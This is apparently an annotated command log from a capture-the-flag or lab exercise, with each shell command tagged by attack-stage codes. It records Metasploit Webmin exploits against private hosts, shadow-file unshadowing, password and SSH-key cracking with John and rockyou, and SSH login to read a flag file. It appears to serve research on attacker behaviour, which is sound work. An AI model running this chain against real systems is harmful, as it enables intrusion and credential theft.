INPUT|86--27|M8 |1594799322|86|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|86--28|A5 |1594799335|86|show targets|OUTPUT
INPUT|86--29|A6 |1594799345|86|set target 0|OUTPUT
INPUT|86--30|A6 |1594799349|86|set target 1|OUTPUT
INPUT|86--31|M5 |1594799353|86|show options|OUTPUT
INPUT|86--32|M6 |1594799373|86|set RHOSTS 172.15.1.5|OUTPUT
INPUT|86--33|M6 |1594799379|86|set RPORT 10000|OUTPUT
INPUT|86--34|A5 |1594799399|86|show|OUTPUT
INPUT|86--35|M5 |1594799404|86|show options|OUTPUT
INPUT|86--36|M8 |1594799415|86|exploit|OUTPUT
INPUT|86--37|U|1594799532|86|quit|OUTPUT
INPUT|86--38|M2 |1594799534|86|msfconsole|OUTPUT
INPUT|86--39|M3 |1594799552|86|search webmin|OUTPUT
INPUT|86--40|M8 |1594799570|86|use exploit/unix/webapp/webmin_show_cgi_exec|OUTPUT
INPUT|86--41|A5 |1594799573|86|show|OUTPUT
INPUT|86--42|A5 |1594799576|86|show targets|OUTPUT
INPUT|86--43|M5 |1594799582|86|show options|OUTPUT
INPUT|86--44|A6 |1594799593|86|set RHOST 172.18.1.5|OUTPUT
INPUT|86--45|A6 |1594799609|86|set USERNAME dmin|OUTPUT
INPUT|86--46|A6 |1594799612|86|set USERNAME admin|OUTPUT
INPUT|86--47|M8 |1594799614|86|exploit|OUTPUT
INPUT|86--48|A6 |1594799625|86|set PASSWORD admin|OUTPUT
INPUT|86--49|M8 |1594799630|86|exploit|OUTPUT
INPUT|86--50|U|1594799699|86|ip a|OUTPUT
INPUT|86--51|M8 |1594799737|86|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|86--52|A5 |1594799743|86|show targets|OUTPUT
INPUT|86--53|A6 |1594799752|86|set TARGET 0|OUTPUT
INPUT|86--54|M5 |1594799757|86|show options|OUTPUT
INPUT|86--55|M6 |1594799762|86|set LHOST 10.1.135.83|OUTPUT
INPUT|86--56|A6 |1594799789|86|set RHOST 172.18.1.5 |OUTPUT
INPUT|86--57|M8 |1594799814|86|exploit|OUTPUT
INPUT|86--58|A6 |1594799835|86|set TARGET 1|OUTPUT
INPUT|86--59|M16 |1594799984|86|ssh eve@10.1.17.4|OUTPUT
INPUT|86--60|U|1594800021|86|man xclip|OUTPUT
INPUT|86--61|A16 |1594800039|86|xclip -selection c -o > .ssh/id_rsa|OUTPUT
INPUT|86--62|A16 |1594800046|86|vim .ssh/id_rsa|OUTPUT
INPUT|86--63|A16 |1594800072|86|vim .ssh/id_rsa.pub|OUTPUT
INPUT|86--64|M16 |1594800081|86|ssh eve@10.1.17.4|OUTPUT
INPUT|86--65|M15 |1594800106|86|chmod 0600 /root/.ssh/id_rsa|OUTPUT
INPUT|86--66|M16 |1594800108|86|ssh eve@10.1.17.4|OUTPUT
INPUT|86--67|M16 |1594800390|86|ssh eve@10.1.17.4|OUTPUT
INPUT|86--68|U|1594800520|86|nc -l 12345|OUTPUT
INPUT|86--69|U|1594800531|86|ip a|OUTPUT
INPUT|86--70|U|1594800554|86|vim shadow|OUTPUT
INPUT|86--71|U|1594800591|86|vim passwd|OUTPUT
INPUT|86--72|U|1594800601|86|unshadow shadow passwd|OUTPUT
INPUT|86--73|U|1594800619|86|unshadow passwd shadow|OUTPUT
INPUT|86--74|U|1594800629|86|unshadow passwd shadow > mypasswd|OUTPUT
INPUT|86--75|A14 |1594800638|86|john mypasswd|OUTPUT
INPUT|86--76|U|1594800887|86|base64 -d|OUTPUT
INPUT|86--77|M12 |1594800905|86|cat .ssh/id_rsa|OUTPUT
INPUT|86--78|M12 |1594800915|86|cat .ssh/id_rsa.pub|OUTPUT
INPUT|86--79|A10 |1594800926|86|ls|OUTPUT
INPUT|86--80|A16 |1594800980|86|cp ~/.ssh/id_rsa|OUTPUT
INPUT|86--81|A16 |1594800986|86|cp ~/.ssh/id_rsa id_rsa|OUTPUT
INPUT|86--82|A14 A16 |1594800998|86|localte ssh2john.py|OUTPUT
INPUT|86--83|A1 A9 A10 A11 A12 A14 A16 A17 |1594801003|86|locate ssh2john.py|OUTPUT
INPUT|86--84|M13 |1594801016|86|python ssh2john.py id_rsa|OUTPUT
INPUT|86--85|M13 |1594801027|86|python ssh2john.py id_rsa > ssh.john|OUTPUT
INPUT|86--86|A14 A16 |1594801030|86|john ssh.john|OUTPUT
INPUT|86--87|A14 A16 |1594801038|86|john ssh.john|OUTPUT
INPUT|86--88|A1 A9 A11 A12 A14 A17 |1594801061|86|cat .john/john.rec|OUTPUT
INPUT|86--89|U|1594801076|86|fg|OUTPUT
INPUT|86--90|A14 A16 |1594801080|86|john ssh.john|OUTPUT
INPUT|86--91|U|1594801202|86|wget https://github.com/praetorian-code/hob0rules/blob/master/wordlists/rockyou.txt.gz|OUTPUT
INPUT|86--92|A1 A9 A11 A12 A17 |1594801220|86|cat rockyou.txt.gz|OUTPUT
INPUT|86--93|A1 A9 A10 A11 A12 A17 |1594801279|86|locate rockyou|OUTPUT
INPUT|86--94|A14 A16 |1594801307|86|john ssh.john -wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--95|A14 A16 |1594801321|86|john ssh.john -wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--96|A10 |1594801335|86|ls /usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--97|U|1594801342|86|ll /usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--98|A10 |1594801348|86|ls -l /usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--99|A14 A16 |1594801358|86|john ssh.john|OUTPUT
INPUT|86--100|A1 A9 A10 A11 A12 A17 |1594801515|86|locate rocky|OUTPUT
INPUT|86--101|A10 |1594801525|86|ls /usr/share/wordlists/|OUTPUT
INPUT|86--102|U|1594801531|86|cd me|OUTPUT
INPUT|86--103|A10 |1594801535|86|ls /usr/share/wordlists/metasploit|OUTPUT
INPUT|86--104|U|1594801764|86|cd|OUTPUT
INPUT|86--105|A1 A9 A10 A11 A12 A14 A16 A17 |1594801779|86|locate ssh2john.py|OUTPUT
INPUT|86--106|A14 A16 |1594801797|86|diff ssh2john.py /usr/share/john/ssh2john.py|OUTPUT
INPUT|86--107|U|1594801808|86|ll|OUTPUT
INPUT|86--108|A10 |1594801809|86|ls|OUTPUT
INPUT|86--109|M13 |1594801837|86|python /usr/share/john/ssh2john.py id_rsa > ssh2.jogn|OUTPUT
INPUT|86--110|A14 A16 |1594801845|86|diff ssh.john ssh2.jogn|OUTPUT
INPUT|86--111|M14 |1594801920|86|john ssh.john --wordlist=/usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--112|A1 A9 A11 A12 A17 |1594801988|86|cat /usr/share/wordlists/rockyou.txt | grep '!hellokitty!!'|OUTPUT
INPUT|86--113|A1 A9 A11 A12 A17 |1594802005|86|cat /usr/share/wordlists/rockyou.txt | grep -n '!hellokitty!!'|OUTPUT
INPUT|86--114|M16 |1594802042|86|ssh eve@10.1.17.4|OUTPUT
INPUT|86--115|U|1594802046|86|nice|OUTPUT
INPUT|86--116|A10 |1594802062|86|ls|OUTPUT
INPUT|86--117|U|1594802064|86|cd top-secret/|OUTPUT
INPUT|86--118|A10 |1594802065|86|ls|OUTPUT
INPUT|86--119|M17 |1594802067|86|cat flag.txt|OUTPUT
INPUT|86--120|U|1594802284|86|ll /usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--121|A10 |1594802287|86|ls -l /usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--122|U|1594802435|86|exit|OUTPUT
INPUT|86--123|A14 A16 |1594802441|86|john ssh.john -wordlist=/usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|86--124|A14 A16 |1594802449|86|john ssh.john -wordlist /usr/share/wordlists/rockyou.txt|OUTPUT
